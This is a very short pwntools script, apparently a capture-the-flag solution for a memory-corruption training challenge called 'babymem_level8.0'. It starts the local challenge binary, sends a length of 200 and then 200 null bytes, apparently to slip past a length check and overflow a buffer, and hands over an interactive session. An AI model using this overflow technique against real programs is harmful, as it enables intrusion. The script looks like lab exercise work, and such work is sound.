from pwn import *
file = "/challenge/babymem_level8.0"
p = process(file)

p.sendline(b'200')
p.sendline(b'\x00'*200)
p.interactive()
